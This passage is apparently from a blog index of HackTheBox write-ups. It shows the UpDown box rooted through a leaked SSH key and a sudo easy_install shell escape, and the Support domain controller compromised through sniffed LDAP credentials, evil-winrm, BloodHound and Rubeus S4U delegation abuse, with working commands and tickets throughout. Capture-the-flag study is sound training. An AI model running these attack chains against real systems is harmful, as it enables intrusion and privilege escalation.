VC84pPezAtU4Z8wF51VLmM3Ooft9+T11j0qk4FgPFSxqt6WDRjJIkwTdKsMvzA5XhKrXhMhWhIpMWRQ1vxzBKDa1C0+XEA4w+uUlWJXg/SKEAb5jkK2FsfMRyFcnYYq7XV2Okqa0NnwFDHJ23nNE/piz14k8ss9xb3edhg1CJdzrMAd3aRwoL2h3Vq4TKnxQY6JrQ/3/QXd6QvZVSxq4iINxYx/wKhpcl5yLD4BCb7cxfZLh8gHSjAu5+L01Ez7E8MPw+VU3QRG4/Y47g0cqDHSERme/ArptmaqLXDCYrRMh1AP+EPfSEVfifh/ftEVhVAbv9LdzJkvUR69Kok5LIhAAAAwCb5o0xFjJbF8PuSasQO7FSW+TIjKH9EV/5Uy7BRCpUngxw30L7altfJ6nLGb2a3ZIi66p0QY/HBIGREw74gfivt4g+lpPjD23TTMwYuVkr56aoxUIGIX84d/HuDTZL9at5gxCvB3oz5VkKpZSWCnbuUVqnSFpHytRgjCx5f+inb++AzR4l2/ktrVl6fyiNAAiDs0aurHynsMNUjvON8WLHlBgS6IDcmEqhgXXbEmUTY53WdDhSbHZJo0PF2GRCnNQAAAMEAyuRjcawrbEZgEUXWz3vcoZFjdpU0j9NSGaOyhxMEiFNwmf9xZ96+7xOlcVYoDxelx49LbYDcUq6g2O324qAmRRRtUPADO3MPlUfI0g8qxqWn1VSiQBlUFpw54GIcuSoD0BronWdjicUP0fzVecjkEQ0hp7gugNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJmtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aaZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWeN4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==-----END OPENSSH PRIVATE KEY-----......www-data@updown:/home/developer/dev$```{: .nolineno}Lets use this private key to access the developer user shell â†’```pythonâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/UpDown]â””â”€$ ssh developer@10.10.11.177 -i id_rsa The authenticity of host '10.10.11.177 (10.10.11.177)' can not be established.ED25519 key fingerprint is SHA256:c0DzrPfIOA6IA7zGJh7Ee/FJ3B2g7R2KnzeUif9zCWQ.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.177' (ED25519) to the list of known hosts.Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat Dec 30 08:46:05 UTC 2023 System load: 0.08 Usage of /: 49.9% of 2.84GB Memory usage: 17% Swap usage: 0% Processes: 224 Users logged in: 0 IPv4 address for eth0: 10.10.11.177 IPv6 address for eth0: dead:beef::250:56ff:feb9:ec82 * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation8 updates can be applied immediately.8 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Aug 30 11:24:44 2022 from 10.10.14.36developer@updown:~$ whoamideveloperdeveloper@updown:~$ iduid=1002(developer) gid=1002(developer) groups=1002(developer)developer@updown:~$```{: .nolineno}Now lets move further â†’```bashdeveloper@updown:~$ sudo -lMatching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser developer may run the following commands on localhost: (ALL) NOPASSWD: /usr/local/bin/easy_installdeveloper@updown:~$```{: .nolineno}I found the exploit through [GTFOBin](https://gtfobins.github.io/gtfobins/easy_install/#sudo) â†’```bashdeveloper@updown:/tmp$ TF=$(mktemp -d)developer@updown:/tmp$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh $(tty) 2>$(tty)')\" > $TF/setup.pydeveloper@updown:/tmp$ sudo easy_install $TFWARNING: The easy_install command is deprecated and will be removed in a future version.Processing tmp.L1OIVDJdYkWriting /tmp/tmp.L1OIVDJdYk/setup.cfgRunning setup.py -q bdist_egg --dist-dir /tmp/tmp.L1OIVDJdYk/egg-dist-tmp-lLxWgc# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# cd /root# ls -altotal 44drwx------ 6 root root 4096 Dec 30 06:38 .drwxr-xr-x 19 root root 4096 Aug 3 2022 ..lrwxrwxrwx 1 root root 9 Jul 27 2022 .bash_history -> /dev/null-rw-r--r-- 1 root root 11 Jun 22 2022 .bash_logout-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Jun 22 2022 .cachedrwxr-xr-x 3 root root 4096 Jul 27 2022 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 66 Aug 1 2022 .selected_editordrwx------ 2 root root 4096 Jun 22 2022 .ssh-rw-r----- 1 root root 33 Dec 30 06:38 root.txtdrwx------ 3 root root 4096 Jun 22 2022 snap# cat root.txt39ddd8eb7ecdad477bd19568207a0891#```{: .nolineno}I am root now !> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Support", "url": "/posts/Support/", "categories": "HackTheBox", "tags": "BloodHound, GenericAll, Rubeus, ldapsearch, powermad", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.174 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nma...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.174 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 12:40 ISTNmap scan report for 10.10.11.174Host is up (0.087s latency).Not shown: 65519 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-16 07:12:48Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49664/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49776/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-01-16T07:13:40|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}## SMB Enumeration â¤µï¸I checked the smb shares through `crackmapexec` tool and got access to some shares with Anonymous user login â†’![Untitled](Support/Untitled.png)I looked into the support-tools share and got these tools inside it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ smbclient //10.10.11.174/support-tools -U 'Anonymous'Password for [WORKGROUP\\Anonymous]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Wed Jul 20 22:31:06 2022 .. D 0 Sat May 28 16:48:25 2022 7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 16:49:19 2022 npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 16:49:55 2022 putty.exe A 1273576 Sat May 28 16:50:06 2022 SysinternalsSuite.zip A 48102161 Sat May 28 16:49:31 2022 UserInfo.exe.zip A 277499 Wed Jul 20 22:31:07 2022 windirstat1_1_2_setup.exe A 79171 Sat May 28 16:50:17 2022 WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 16:49:43 2022\t\t4026367 blocks of size 4096. 973703 blocks availablesmb: \\> exit```{: .nolineno}I checked `UserInfo.exe.zip` file since this file could contain some more data related to this machine â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support/UserInfo]â””â”€$ ./UserInfo.exe Usage: UserInfo.exe [options] [commands]Options: -v|--verbose Verbose output Commands: find Find a user user Get information about a user â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support/UserInfo]â””â”€$ ./UserInfo.exe find -v [-] At least one of -first or -last is required.```{: .nolineno}I got to know it is working and also I noticed wireshark in the shares may be I have to observe the packets through wireshark of this UserInfo.exe execution, So Lets try it now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support/UserInfo]â””â”€$ ./UserInfo.exe find -first john[-] Exception: No Such Object```{: .nolineno}After execution of this Command before hand I opened the wireshark with Interface `any` and got some packets like this â†’![Untitled](Support/Untitled%201.png)I got these packets and within these packets I got a packet from LDAP so I followed TCP Stream (Ctrl+Alt+Shift+T) and got this data â†’![Untitled](Support/Untitled%202.png)![Untitled](Support/Untitled%203.png)I got some credentials like this â†’```bashsupport\\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz```{: .nolineno}## LDAP Enumeration â¤µï¸Lets try it on ldapsearch for more information extraction â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ ldapsearch -x -H ldap://10.10.11.174 -b 'dc=support,dc=htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \"(objectclass=*)\" -D \"support\\\\ldap\"# extended LDIF## LDAPv3# base with scope subtree# filter: (objectclass=*)# requesting: ALL## support.htbdn: DC=support,DC=htbobjectClass: topobjectClass: domainobjectClass: domainDNSdistinguishedName: DC=support,DC=htbinstanceType: 5whenCreated: 20220528110146.0ZwhenChanged: 20240122100830.0ZsubRefs: DC=ForestDnsZones,DC=support,DC=htbsubRefs: DC=DomainDnsZones,DC=support,DC=htbsubRefs: CN=Configuration,DC=support,DC=htbuSNCreated: 4099dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAA5VYBKcsiG0+bllUW2Ew2PA==uSNChanged: 86045name: supportobjectGUID:: o9k8VcSGZE2ehVFGqYyGjg==replUpToDateVector:: AgAAAAAAAAAJAAAAAAAAAOVWASnLIhtPm5ZVFthMNjwCQAAAAAAAAPt+5 xgDAAAAZ6vYPcTkRkO0MFdWs1QQvg8QAQAAAAAAVnnwGAMAAAD+QDhi4WGeQJzRK0Oxy/DzETABAA AAAADin/AYAwAAAE1xSnqneJdOoS4KYD+/c0AOAAEAAAAAAGMS6xgDAAAAd62sflaFQUqcdbgJy/U K7xJAAQAAAAAAFbi5GwMAAAA9xlubHL0ORprzS2KWPEOHBGAAAAAAAAB6xegYAwAAAJjUpNK4xSxH t3H97S3gZQcFcAAAAAAAAKPC6RgDAAAAJ7XI2ms7OEip16SpLPtxPgzgAAAAAAAAOjnqGAMAAAAOD l7iB/ErRroAvsLVrzARE1ABAAAAAACdz74bAwAAAA==creationTime: 133503917109353380forceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 0maxPwdAge: -9223372036854775808minPwdAge: -864000000000minPwdLength: 7modifiedCountAtLastProm: 0nextRid: 1000pwdProperties: 1pwdHistoryLength: 24objectSid:: AQQAAAAAAAUVAAAAG9v9Y4G6g8nmcEILserverState: 1uASCompat: 0modifiedCount: 1auditingPolicy:: AAE=nTMixedDomain: 0rIDManagerReference: CN=RID Manager$,CN=System,DC=support,DC=htbfSMORoleOwner: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN =Sites,CN=Configuration,DC=support,DC=htbsystemFlags: -1946157056wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=supp ort,DC=htbwellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra m Data,DC=support,DC=htbwellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=sup port,DC=htbwellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin cipals,DC=support,DC=htbwellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC= support,DC=htbwellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=s upport,DC=htbwellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=sup port,DC=htbwellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=support,D C=htbwellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers, DC=support,DC=htbwellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=suppor t,DC=htbwellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=support,DC =htbobjectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=support,DC=htbisCriticalSystemObject: TRUEgPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste m,DC=support,DC=htb;0]dSCorePropagationData: 16010101000000.0ZotherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=suppor t,DC=htbotherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic e Accounts,DC=support,DC=htbmasteredBy: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Si tes,CN=Configuration,DC=support,DC=htbms-DS-MachineAccountQuota: 10msDS-Behavior-Version: 7msDS-PerUserTrustQuota: 1msDS-AllUsersTrustQuota: 1000msDS-PerUserTrustTombstonesQuota: 10msDs-masteredBy: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name, CN=Sites,CN=Configuration,DC=support,DC=htbmsDS-IsDomainFor: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name ,CN=Sites,CN=Configuration,DC=support,DC=htbmsDS-NcType: 0msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUEdc: support```{: .nolineno}Lets extract `SAMAccountNames` and put it in a file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ ldapsearch -x -H ldap://10.10.11.174 -b 'dc=support,dc=htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \"(objectclass=*)\" -D \"support\\\\ldap\" \"sAMAccountName\" | grep sAMAccountName: sAMAccountName: AdministratorsAMAccountName: GuestsAMAccountName: AdministratorssAMAccountName: UserssAMAccountName: GuestssAMAccountName: Print OperatorssAMAccountName: Backup OperatorssAMAccountName: ReplicatorsAMAccountName: Remote Desktop Users......```{: .nolineno}I got the `username.txt` file which contains all the SAMAccountNames so lets try for kerbrosting and let see could any user contains the ticket as kerbrose user but no luck all those user donâ€™t have kerbrose tickets.![Untitled](Support/Untitled%204.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ cat kerbrute_users.txt | awk '{print $7}' | cut -d '@' -f 1 | sed 's/ //g' > users.txt```{: .nolineno}I also filtered some more informations from ldapsearch data and I got a password â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ cat ldapsearch.txt | grep -i Info:info: Ironside47pleasure40Watchful```{: .nolineno}For finding user I used crackmapexec for smb login shares and username list from `users.txt` file â†’![Untitled](Support/Untitled%205.png)I get it now â†’```bashsupport.htb\\support:Ironside47pleasure40Watchful```{: .nolineno}Lets try accessing winrm service â†’![Untitled](Support/Untitled%206.png)### Winrm Session â¤µï¸Lets have a shell now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful' Evil-WinRM shell v3.5*Evil-WinRM* PS C:\\Users\\support\\Documents> whoamisupport\\support*Evil-WinRM* PS C:\\Users\\support\\Documents> hostnamedc*Evil-WinRM* PS C:\\Users\\support\\Documents> *Evil-WinRM* PS C:\\Users\\support\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\support> tree /f /aFolder PATH listingVolume serial number is 955A-5CBBC:.+---Desktop| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\support>```{: .nolineno}Now lets start bloodhound â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Support]â””â”€$ sudo python3 /opt/Tools/BloodHound.py/bloodhound.py -d support.htb -u 'support' -p 'Ironside47pleasure40Watchful' -dc support.htb -ns 10.10.11.174 -c all[sudo] password for kali: INFO: Found AD domain: support.htbINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)INFO: Connecting to LDAP server: support.htbINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: support.htbINFO: Found 21 usersINFO: Found 53 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: Management.support.htbINFO: Querying computer: dc.support.htbINFO: Done in 00M 24S```{: .nolineno}After Observing the best path of action I got this â†’![Untitled](Support/Untitled%207.png)since `Support` is a member of `Shared Support Accounts` Group so the user `Support` have `GenericAll` Rights on `Domain Controller` so lets abuse that with with BloodHound path ways. ![Untitled](Support/Untitled%208.png)I will need these 3 Tools for this Abuse:1. PowerView.ps12. PowerMad.ps13. Rubeus.exeI followed bloodhound path for adding a new Computer as `StrongShiv8` that will have privilege to impersonate as Administrator.```powershellNew-MachineAccount -MachineAccount StrongShiv8 -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)$ComputerSid = Get-DomainComputer StrongShiv8 -Properties objectsid | Select -Expand objectsid$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}```{: .nolineno}As I have added this Computer into the domain controller machine so lets find the hash of its account. ```powershell*Evil-WinRM* PS C:\\Users\\support\\Documents> .\\Rubeus.exe hash /password:Passw0rd! ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.1[*] Action: Calculate Password Hash(es)[*] Input password : Passw0rd![*] rc4_hmac : FC525C9683E8FE067095BA2DDC971889[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!*Evil-WinRM* PS C:\\Users\\support\\Documents>```{: .nolineno}Lets have a impersonation ticket as Administrator user â†’```powershell*Evil-WinRM* PS C:\\Users\\support\\Documents> .\\Rubeus.exe s4u /user:StrongShiv8$ /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:cifs/StrongShiv8.support.htb /ptt /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.1[*] Action: S4U[*] Using rc4_hmac hash: FC525C9683E8FE067095BA2DDC971889[*] Building AS-REQ (w/ preauth) for: 'support.htb\\StrongShiv8$'[*] Using domain controller: ::1:88[+] TGT request successful![*] base64(ticket.kirbi): doIFhDCCBYCgAwIBBaEDAgEWooIEmDCCBJRhggSQMIIEjKADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBFIwggROoAMCARKhAwIBAqKCBEAEggQ8pkgrsbXbJrt+/tCECArwdrKR8RazujHGpEu6CtLytK3hat1TkmZAh+irj3zQV9xzu6/hQzhQM8Oklz+GIMMmSPMKQ9cv371mSFtrp3V7RcS+Cq0UlwyMm7ZZZWFt09xAqDTahTTEtKTP55rV9GdPiQaGpfvxXaolEfYtUYUCrROCL+4HqFVNQM38SF06AIxRkWh+KFiAKJa0xLzl8MngD6CGIKDwWtvxk7IGUzoCpBj6P77noZ8JNqFDXweDQ/9C1nwC4f3x3sDsI2MFiUguqPP2YDDfY2xYKVQEFtU1S02ay2qEnQY5qVUBiYkGRRYLK5Z1bOkQYTp0M0sub1FAyP9+9yMJ9uHKV30i4IfmkYg1OjZ5gHhWkclrDqCieH1GM7G9XpUVoeYzP+xSUt1xqSlMdATS89YX3dDLGzbZJ6OeR8yhr9F7GM80fq6nZgKybbDKwO77LKqbMoZVNg9Xm/vQkg4rUrHlcqADSiINAUeOjonI9f1MfQ8dPEyJ7H68KyfqYEjyc0xkravENhJBmrFsF9hF7Mo5KNpDmbfluQ4gU4fNr+LtrIWcKuR/zGWOaXmNqZUGIB5ajcjQthIYNfvRYRu6iJlfTu0us+5AUvTJ2nHfboLVbIDrcd5fGu4/0iSUqUdyRT85D1SnuaMIDwSfRIqeu6ZqEHSeZdS7+s/MLn6ENOH2bvLhLOQeTCYAJA5crcZxh8L9keQu6gjjQSaH1+mmbp8PtYos5W9WGR6MnGs975iuSj1glO3L2D/5HmO2nKJHfxyXxT3nm1UJxiRyITCgWcBffywDy5cNazRg0Xyl9OLA+yM71j6S3RS2ZtVrL0w7bkfb+h9OeoEX25T7nopRD3+O3ltH1rMqYW/DanF4EHRBJwl6Z+hFxqI5mExbEtG1667zWAmX0NGv51Z7tZCKIgtLB/xJSyOUZ621doI+n9U7/zj5MoohGuqap7+ScMKXkUeZ09pAhGgelp4DEFCZge2oBobd774v/Kk4o2iEjJOAH1bctPJlr+4ocI5MiHI9yUBi/YyeU2BF2O9VOeOOsFkQVsXYLbU/N0oq3qe8+siBEBdssDsVp9CsaEcVgUji8t/IjO388Slm8w1Vcr7lq+8A37xRXyGwMdRyGziZpELKSf7JWsCpglYM/KnrN8svdjWa5jSywU+NXELRc6EVdi76FXphrnIOrbh9sGJRdmY8g4tAa1g1u7F264rAvstmc4aOI7nDhiTfZtXjbY5DGEafS0CcIUPdS5IxTTe+BWVRkLg4x8WAqiXYCRhxOCe0x05I6CE+bKqXS0iC7xbU6ye9lCCkOmv3+4eIvj4ilXKNqzYE3S5EGe1jzgrKwjzKRrAlTKgidfFe2Gbkp++sFSPIUO5TLc/qoobXLqlUj8fRgECnTs9GzLrXOXNdWSlID+ApwLSShJyu0OTPrKqF7Ipeh/jbIKOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEEO85LUq0X1OuIfRZWS+auTehDRsLU1VQUE9SVC5IVEKiGTAXoAMCAQGhEDAOGwxTdHJvbmdTaGl2OCSjBwMFAEDhAAClERgPMjAyNDAxMjIxMzQzNTVaphEYDzIwMjQwMTIyMjM0MzU1WqcRGA8yMDI0MDEyOTEzNDM1NVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBvcnQuaHRi[*] Action: S4U[*] Building S4U2self request for: 'StrongShiv8$@SUPPORT.HTB'[*] Using domain controller: dc.support.htb (::1)[*] Sending S4U2self request to ::1:88[+] S4U2self success![*] Got a TGS for 'administrator' to 'StrongShiv8$@SUPPORT.HTB'[*] base64(ticket.kirbi): doIFrDCCBaigAwIBBaEDAgEWooIExjCCBMJhggS+MIIEuqADAgEFoQ0bC1NVUFBPUlQuSFRCohkwF6ADAgEBoRAwDhsMU3Ryb25nU2hpdjgko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHFqAK99pFqvsfQIYOZ3Yi4seojjFOuUrxS6VdFHxcWhHMkPPNGlkSnTt1HDDfIniEh1lUynuHtt9GA8TvdsrKjnFWYodjsTsfUOmtU3sr6kg/1et1d55s5vUGxFsEB3K0LkKzG4nWbf46DbuHRg6UFQ8zRvqyjuqTE01h/8ZKa4DBFjWQI/UFzERYGBC995chu8VyiExvczUAQb1UMmCIAmNsL4OD+cU8FZ6/7MSXujTpitVDRCp5ZhUchrxSUcKl1yeX39jwJymLG+FXIgAOAa8ruQG0RWW8Xhx70x3BAEO1Kau/Zz1r949IQFUFpDm15BzBwHV+MJjsqfTwMJ9Uk0fXs+bWhcMeUFNFt0zTTnenA0Z/zeShXAYKSUWbWmGe+t/TUAD4fMmWSRVD335jlwARU0xA397PlXukRTGQvLg3aJjXEuvjNBpy8sL1Sj2YeFENhYftMfEj+9IeLljVu2jpI+SIM2We7/OowIdqlylwM4lCA1xbmCgn4tf+Z/0QW+KQDQeR+d52VsE4Qmzx3kXtnuhZIFKK622NF/XP3YvQ+5EazK39RP03Pz1d+pGAqSbYhLALcscesibpqDqG4zPmazcez5VgHkBvMoVPiKfOyxdzDwGkCMSJ+o76LDag2u7UgXrJv64MyPs6V3Jk8GxYGzpIa16Hw7iwUUIL8BMCjnbLH0ky+msUwG8QBH1FskaLwD8+FkoMcCqGzSU9Q4mN/vlVoP6bka3dgbfQ35ybwyckNMnLxdaW6q6wJXZ44xyMs36W4Sdu/0VE5XPnyd3qOPJBRJ4ioG7WHoHGwCfa0yMztEjZzm/wrX3B/MxT0oFJkCrVopHqsxdoz/JpLFoSAmAuPmz8mbxDJSMnbHnqMI9KkX6CziKKh0TlV496kiCxSON3wKZE+cE7Kcieq3uNpIlaQHecuFwqLzy+mXhKrdI0dspx+r3uBDB+jkhdhnZTJ3hEWzqMA455ZVMW/RRUjVqMwAJYVkiXkWWI0Oa6ttgdbSGxGHvbXaSU7+N08JYjfdNP4gNv4CPiBzoZu/daKm0AymQwAcnMoZckFBEtmmmFNMqtCqVf/v8jK1g7up9C13EJcdDm9q/l85TIxp4mOMYJoFnju5ddtXRjrLso8T0Cv8/OuFR2Nc4qjVo8F1bPcnz+xZfxlj1cIcZCn272lp8yUF7HvucH0T+CsNwwmbEPOVQYAyrquSBoRNxu89B31weOQii2duQlmWlZYB2w8nVsmfYSF1OZ99FeChfoY8lqFRw7S9EojWGXvNqv5xbdqOX9y56iYVmolp7hkVk5UDBv4ODxyPV8mFjqZuy0k5FUpKt38EM5nSPOhlEfqNriSTSJj6eMEeQsvUWW8oRqUamAAOKosvuTvuliZzpV8oQH/drP0VbhO13ZspX8YzIJE5irQ/9vJFDxf6rZFj9OuJI6+j+NhhOFwt8AijxEih6Lbv92XGqcZRxfKRqyzuH3rYfoffhFKQSj7slsMLkVMa6NY7qtTND3OwNiwtt2ujgdEwgc6gAwIBAKKBxgSBw32BwDCBvaCBujCBtzCBtKAbMBmgAwIBF6ESBBAV+XXcKmNjU8cpxw697a1poQ0bC1NVUFBPUlQuSFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI0MDEyMjEzNDM1NVqmERgPMjAyNDAxMjIyMzQzNTVapxEYDzIwMjQwMTI5MTM0MzU1WqgNGwtTVVBQT1JULkhUQqkZMBegAwIBAaEQMA4bDFN0cm9uZ1NoaXY4JA==[*] Impersonating user 'administrator' to target SPN 'cifs/StrongShiv8.support.htb'[*] Building S4U2proxy request for service: 'cifs/StrongShiv8.support.htb'[*] Using domain controller: dc.support.htb (::1)[*] Sending S4U2proxy request to domain controller ::1:88[+] S4U2proxy success![*] base64(ticket.kirbi) for SPN 'cifs/StrongShiv8.support.htb': 